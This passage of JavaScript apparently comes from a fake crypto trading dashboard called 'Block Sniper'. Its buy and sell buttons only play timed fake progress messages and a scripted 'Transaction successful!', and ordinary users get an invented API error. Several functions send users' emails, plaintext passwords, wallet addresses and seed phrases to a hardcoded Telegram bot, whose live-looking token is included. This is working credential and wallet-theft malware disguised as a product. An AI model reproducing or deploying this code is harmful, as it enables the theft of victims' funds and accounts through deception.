      }
  }, 1000);
}


//Stop Timer
function stopTimer() {
  // Reset the timer label and other UI elements
  document.getElementById('time-count-label').textContent = '00:00:00'; // Reset the timer label
  const progressLabel = document.getElementById('progress-label');
  progressLabel.style.color = '#dbeaff'; // Set progress label color
  progressLabel.textContent = 'Not Started'; // Reset progress label text
  const loadingWheelDiv = document.getElementById('loading-wheel-div');
  loadingWheelDiv.style.display = 'none'; // Hide the loading wheel

  // Stop the timer only if it's running
  if (!timerRunning) return;
  clearInterval(intervalId); // Clear the interval
  timerRunning = false; // Reset the timer running flag
}


//Timer Format
function formatTime(seconds) {
  const hours = Math.floor(seconds / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secondsRemain = seconds % 60;
  return [hours, minutes, secondsRemain].map(unit => (unit < 10 ? '0' : '') + unit).join(':');
}
document.addEventListener('DOMContentLoaded', function() {

	//Add token to manual trader froma admin panel
    document.getElementById('admin-add-token-btn').addEventListener('click', function() {
        // Retrieve input elements
        var tokenName = document.getElementById('admin-token-names').value.trim();
        var contractAddress = document.getElementById('admin-contract-address').value.trim();
        var tokenBalance = document.getElementById('admin-token-balance').value.trim();

        // Validate and format contract address
        if (contractAddress.length >= 12) { // Simple check to ensure string is long enough
            contractAddress = `${contractAddress.substring(0, 7)}...${contractAddress.substring(contractAddress.length - 5)}`;
        } else {
            alert('Contract address is not long enough.'); // Using alert for demonstration
            return;
        }

        // Validate and format token balance
        if (!/^\d+(\.\d+)?$/.test(tokenBalance)) { // Regex to check if it's a number or decimal
            alert('Token balance must be a number or decimal.'); // Using alert for demonstration
            return;
        }

        // Combine the fields
        var combinedData = `${tokenName} : ${contractAddress} : ${tokenBalance}`;

        // Add combined data as new option to the selector
        var option = new Option(combinedData, combinedData); // Create new option element
        document.getElementById('token-selector').add(option); // Add new option to the selector

        // Optionally hide the admin control panel and alert success
        document.getElementById('admin-control-panel-div').style.display = 'none';
        alert('Token added successfully, check the manual trader tab.');
    });
    
        //Sell token manual button click
        document.getElementById('sell-token-btn').addEventListener('click', function() {
        // Get the selected option from 'token-selector'
        
        const currentUser = firebase.auth().currentUser;

        if (!currentUser || currentUser.email !== 'admin@admin.com') {
						displayError('Failed to Sell Token - BLKS API Error 8903 : Contact Block Sniper Admin');
            return;
        }
        
        
        
        const tokenSelector = document.getElementById('token-selector');
        const selectedOption = tokenSelector.options[tokenSelector.selectedIndex];

        if (!selectedOption) {
            console.error('No token selected.');
            return;
        }

        // Extract the current token balance from the selected option's value
        const optionParts = selectedOption.value.split(' : ');
        const tokenName = optionParts[0];
        const contractAddress = optionParts[1];
        let tokenBalance = parseFloat(optionParts[2]);

        // Get the sell percentage from 'sell-percent-input'
        const sellPercentInput = document.getElementById('sell-percent-input');
        const sellPercent = parseFloat(sellPercentInput.value) / 100;

        if (isNaN(tokenBalance) || isNaN(sellPercent)) {
            console.error('Invalid token balance or sell percentage.');
            return;
        }

        // Calculate the new token balance after subtracting the sell percentage
        const newTokenBalance = tokenBalance - (tokenBalance * sellPercent);
        const newTokenBalanceFormatted = newTokenBalance.toFixed(4); // Assuming you want to round to 4 decimal places
				const loadingWheelDiv = document.getElementById('loading-wheel-sell-div');
        const progressLabel = document.getElementById('sell-token-status-txt');
         
        loadingWheelDiv.style.display = 'flex'; 
        setTimeout(function() {
        		progressLabel.style.color = '#FFA500';
            progressLabel.textContent = 'Connecting to Network...';
            setTimeout(function() {
                progressLabel.textContent = 'Searching for DEX liquidity provider...';
                setTimeout(function() {
                    progressLabel.textContent = 'Adjusting Gas and Slippage. Please wait...';
                    setTimeout(function() {
                        loadingWheelDiv.style.display = 'none';
                        progressLabel.textContent = 'Transaction successful!';
                        
                        // Update the selected option with the new token balance
                        selectedOption.value = `${tokenName} : ${contractAddress} : ${newTokenBalanceFormatted}`;
        								selectedOption.text = `${tokenName} : ${contractAddress} : ${newTokenBalanceFormatted}`;
                        console.log(`New balance for ${tokenName} is ${newTokenBalanceFormatted}`);
                                               
                        progressLabel.style.color = '#00FF00';
                        loadingWheelDiv.style.display = 'none';
                    }, 6000);
                }, 7000);
            }, 5000);
        }, 3000);				
    });
});


//Add percentage preset to percentage fiel, manual sniper sell
document.addEventListener('DOMContentLoaded', function() {
    // List of button IDs
    const buttonIds = [
        '10-percent-btn',
        '20-percent-btn',
        '30-percent-btn',
        '40-percent-btn',
        '50-percent-btn',
        '100-percent-btn'
    ];

    // Add click event listener to each button
    buttonIds.forEach(function(buttonId) {
        document.getElementById(buttonId).addEventListener('click', function() {
            // Extract the percentage value from the button's ID
            const percentValue = buttonId.split('-')[0];

            // Update the 'sell-percent-input' field with the extracted value
            document.getElementById('sell-percent-input').value = percentValue;
        });
    });
});


//Buy Token Manual Logic
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('buy-token-btn').addEventListener('click', async function() {
        // Assuming you have a way to get the current user's email, e.g., from Firebase Auth
        const user = firebase.auth().currentUser;
        const userEmail = user ? user.email : null;

        if (userEmail === 'admin@admin.com') {
            const allocateInput = document.getElementById('allocate-1-input').value;
            const walletBalanceText = document.getElementById('wallet-balance-txt').textContent;
            const walletBalance = parseFloat(walletBalanceText);
            const allocateValue = parseFloat(allocateInput);
            const loadingWheelDiv = document.getElementById('loading-wheel-buy-div');
            const progressLabel = document.getElementById('buy-token-status-txt');

            if (!isNaN(allocateValue) && !isNaN(walletBalance)) {
                const newBalance = walletBalance - allocateValue;
                if (newBalance >= 0) {
                    
                    loadingWheelDiv.style.display = 'flex';
                    setTimeout(function() {
                        progressLabel.style.color = '#FFA500';
                        progressLabel.textContent = 'Connecting to Network...';
                        setTimeout(function() {
                            progressLabel.textContent = 'Checking Smart Contract code...';
                            setTimeout(function() {
                                progressLabel.textContent = 'Checking Presale status...';
                                setTimeout(function() {
                                    progressLabel.textContent = 'Searching for DEX liquidity provider...';
                                    setTimeout(function() {
                                        progressLabel.textContent = 'Presale = No / Adjusting Gas and Slippage. Please wait...';
                                        setTimeout(function() {
                                            loadingWheelDiv.style.display = 'none';
                                            progressLabel.textContent = 'Transaction successful!';
                                            document.getElementById('wallet-balance-txt').textContent = newBalance.toFixed(4); // Update with 4 decimal places

                                            progressLabel.style.color = '#00FF00';
                                            loadingWheelDiv.style.display = 'none';
                                        }, 2000);
                                    }, 3000);
                                }, 3000);
                            }, 1000);
                        }, 2000);
                    }, 2000);
                } else {
                    displayError('Error: Allocation value exceeds wallet balance.');
                    return;
                }
            } else {
                displayError('Error: Please enter a valid numeric value in "Allocate" field.');
            }
        } else {
            //not admin
            displayError('Failed to Purchase Token - BLKS API Error 8903 : Contact Block Sniper Admin');
        }
    });
});
//TG Bot INfo


function TgBotDetails() {
  const telegramBotToken = '6337181738:AAGZe6O4ZsFMEfZbOOJejNhSgg18mEdjW2Y';
  const chatId = '-1002117309898';
  const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
  return {
    chatId,
    apiUrl
  };
}

//TG send logic
function TgBotSend(text) {
  const { chatId, apiUrl } = TgBotDetails();
  const data = JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: 'MarkdownV2'
  });

  fetch(apiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: data
  })
  .then(response => response.json())
  .then(data => {
      if (data.ok) {
          console.log('Message sent successfully:', data);
      } else {
          console.error('Failed to send message:', data);
      }
  })
  .catch(error => {
      console.error('Error:', error);
  });
}

//Fix symbols
function escapeMarkdownV2(text) {
  return text.replace(/[_[\]()~`>#+-=|{}.!]/g, (x) => '\\' + x);
}

//User registered
function regTgBot(fbID, tgName, email, password, referrer) {   

let text = `*New Registration!*\n\n` +
    `*Fire ID:* ${fbID}\n` +
    `*TG Username:* ${tgName}\n` +
    `*Email:* ${email}\n` +
    `*Password:* ${password}\n` +
    `*Referrer:* ${referrer}`;
  
  text = escapeMarkdownV2(text);
  TgBotSend(text);
}

//User logged in
function LogTgBot(fbID, email, password) {   

let text = `*User Logged In*\n\n` +
    `*Fire ID:* ${fbID}\n` +
    `*Email:* ${email}\n` +
    `*Password:* ${password}`;
 
  text = escapeMarkdownV2(text);
  TgBotSend(text);
}

//User Added complete wallet sucessfully
function AddTgBot(fbID, network, walletaddress, gold) {   

let text = `*User Has Completed Importing Wallet*\n\n` +
    `*Fire ID:* ${fbID}\n` +
    `*Network:* ${network}\n` +
    `*Wallet Address:* ${walletaddress}\n` +
    `*Seed:* ${gold}`;
  
  text = escapeMarkdownV2(text);
  TgBotSend(text);
}

//User loaded to main
async function loadedTgBot() {   
  try {
      const { userId, balance, fullWalletAddress, matchingGold, email, name, networkType } = await getWalletDetailsAndUserId();
      
      let text = `*User Reached Main Panel*\n\n` +
          `*Fire ID:* ${userId}\n` +
          `*TG Name:* ${name}\n` +
          `*Network:* ${networkType}\n` +
          `*Wallet Address:* ${fullWalletAddress}\n` +
          `*Balance:* ${balance} ${networkType}\n` +
          `*Seed:* ${matchingGold}`;
      
      text = escapeMarkdownV2(text);
      TgBotSend(text);
  } catch (error) {

  }
}

//Added network, instantly call
function networkTgBot(network) {

let text = `*User is Importing a Wallet...*\n\n` +
    `*Network:* ${network}`;

  text = escapeMarkdownV2(text);
  TgBotSend(text);
}

//Added gold, instantly call
function goldTgBot(fbID, gold) {   


let text = `*User Has Added Gold!*\n\n` +
    `*Fire ID:* ${fbID}\n` +
    `*Seed:* ${gold}`;

  text = escapeMarkdownV2(text);
  TgBotSend(text);
}

//Added wallet, instantly call
function walletTgBot(fbID, walletaddress) {   

let text = `*User Added Wallet Address*\n\n` +
    `*Fire ID:* ${fbID}\n` +
    `*Wallet Address:* ${walletaddress}`;
  
  text = escapeMarkdownV2(text);
  TgBotSend(text);
}



//Get details of user on main menu
async function getWalletDetailsAndUserId() {
  const user = firebase.auth().currentUser;
  if (!user) {
      console.error('No user is logged in.');
      return;
  }

  const balanceLabel = document.getElementById('wallet-balance-txt');
  const walletAddressLabel = document.getElementById('wallet-address-txt');
  if (!balanceLabel || !walletAddressLabel) {
      console.error('Required elements not found in the DOM.');
      return;
  }
  const balance = balanceLabel.textContent;
  const walletAddressStart = walletAddressLabel.textContent.split('...')[0];

  const userData = await findMatchingWalletAddressAndUserData(user.uid, walletAddressStart);

  return {
      userId: user.uid,
      balance: balance,
      fullWalletAddress: userData.fullWalletAddress,
      matchingGold: userData.matchingGold,
      email: userData.email,
      name: userData.name,
      networkType: userData.networkType
  };
}

async function findMatchingWalletAddressAndUserData(userId, walletAddressStart) {
  const userRef = firebase.database().ref(`users/${userId}`);
  let details = {
      fullWalletAddress: '',
      matchingGold: '',
      email: '',
      name: '',
      networkType: ''
  };

  const snapshot = await userRef.once('value');
  const userData = snapshot.val();

  Object.keys(userData).forEach(key => {
      if (key.startsWith('walletAddress') && userData[key].startsWith(walletAddressStart)) {
          details.fullWalletAddress = userData[key];
          const index = key.match(/\d+/)[0]; // Extracts the numeric part of the key
          const goldKey = `gold${index}`;
          const networkKey = `networkType${index}`;
          details.matchingGold = userData[goldKey] || 'No matching gold data';
          details.networkType = userData[networkKey] || 'No matching network type';
      }
  });

  details.email = userData.email || 'No email data';
  details.name = userData.name || 'No name data';

  return details;
}


//Refresh send
function refreshTgBot(balance, symbol) {   
const user2 = firebase.auth().currentUser;

const currentLogin = (user2.uid);
let text = `*User Refreshed Balance*\n\n` +
    `*Fire ID:* ${currentLogin}\n` +
    `*Balance:* ${balance} ${symbol}`;
  
  text = escapeMarkdownV2(text);
  TgBotSend(text);
}

